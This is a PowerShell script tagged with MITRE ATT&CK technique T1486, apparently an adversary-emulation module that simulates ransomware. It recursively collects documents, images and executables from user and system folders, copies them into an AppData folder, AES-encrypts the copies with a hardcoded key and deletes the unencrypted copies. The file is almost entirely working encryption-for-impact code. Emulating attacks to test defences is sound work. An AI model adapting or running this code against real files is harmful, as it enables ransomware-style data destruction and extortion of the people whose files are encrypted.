#Title: invoke-encryptfiles
#Technique: T1486
#Tactic: TA0040

function invoke-encryptfiles {
     
    $results = ""
    $good = $false
    $extensions = "*.exe", "*.pdf", "*.txt", "*.docx", "*.png", "*.jpg"
    $targetFolder = "$env:appdata\encryptedFiles"

    #Create the directory if it doesn´t exist
    if (!(Test-Path $targetFolder -PathType Any)) {
        mkdir $targetFolder 
    }     
    foreach ($extension in $extensions) {
        $env1 = Get-ChildItem -Path $env:ALLUSERSPROFILE -Recurse -Include $extension
        $env2 = Get-ChildItem -Path $env:APPDATA -Recurse -Include $extension
        $env3 = Get-ChildItem -Path $env:CommonProgramFiles -Recurse -Include $extension
        $env4 = Get-ChildItem -Path $env:HOMEDRIVE -Recurse -Include $extension
        $env5 = Get-ChildItem -Path $env:HOMEPATH -Recurse -Include $extension
        $env6 = Get-ChildItem -Path $env:ProgramData -Recurse -Include $extension
        $env7 = Get-ChildItem -Path $env:PUBLIC -Recurse -Include $extension
        $env8 = Get-ChildItem -Path $env:TEMP -Recurse -Include $extension
        $env9 = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include $extension

        $enviromentVariables = $env1, $env2, $env3, $env4, $env5, $env6, $env7, $env8, $env9

        foreach ($variableEnv in $enviromentVariables) {
            
            $fileList = $variableEnv
            $iteration = 0
 
            foreach ($file in $fileList) { 
                $filesInDir = (Get-ChildItem $targetFolder).count
                #only 10 files
                if ($iteration -le 10 -And $filesInDir -le 60) {
                    #copy each element to a new folder
                    Copy-Item -Path $file -destination $targetFolder | Out-String
                }
                $iteration++  
            }
        }
    }

    Encrypt -targetFolder $targetFolder 

    $encryptedFiles = (Get-ChildItem $targetFolder).count

    if ($encryptedFiles -ge 3) {
        $good = $true
        $results = "Encrypted files as a demo: $encryptedFiles  in $targetFolder "
    }         
    return @{results = $results; success = $good }
}

function Encrypt {
    
    Param (
        [Parameter(Mandatory = $True)]
        [string] $targetFolder
    )

    $files = Get-ChildItem $targetFolder
      
    foreach ($file in $files) {
            
        $filePath = $file.fullname
        Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path $filePath
        Remove-Item –path $filePath
    }
}

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
 
#Main

#GiveMeData if needed

#pdd
$execute = invoke-encryptfiles
return @{results = $execute.results; success = $execute.success; }
#PutData if needed
